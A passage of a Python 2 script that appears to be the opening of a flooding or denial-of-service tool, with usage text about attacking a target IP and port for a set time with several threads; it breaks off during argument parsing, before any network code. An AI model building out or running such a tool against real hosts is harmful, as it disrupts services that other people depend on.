import socket
import time
import datetime
import sys
import os

#help function
def help():
    print "\nUsage: python %s <ip> <port> <time> <threads>\n" % (sys.argv[0])
    print "\t<ip>\t\tThe ip to attack"
    print "\t<port>\t\tThe port to attack"
    print "\t<time>\t\tThe time in seconds to attack"
    print "\t<threads>\tThe number of threads to use\n"
    print "\tExample: python %s 192.168.0.1 80 60 10\n" % (sys.argv[0])

#main function
def main():
    #check args
    if len(sys.argv) < 5:
        help()
        sys.exit(1)
    #init variables
    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])
    threads = int(sys.argv[4
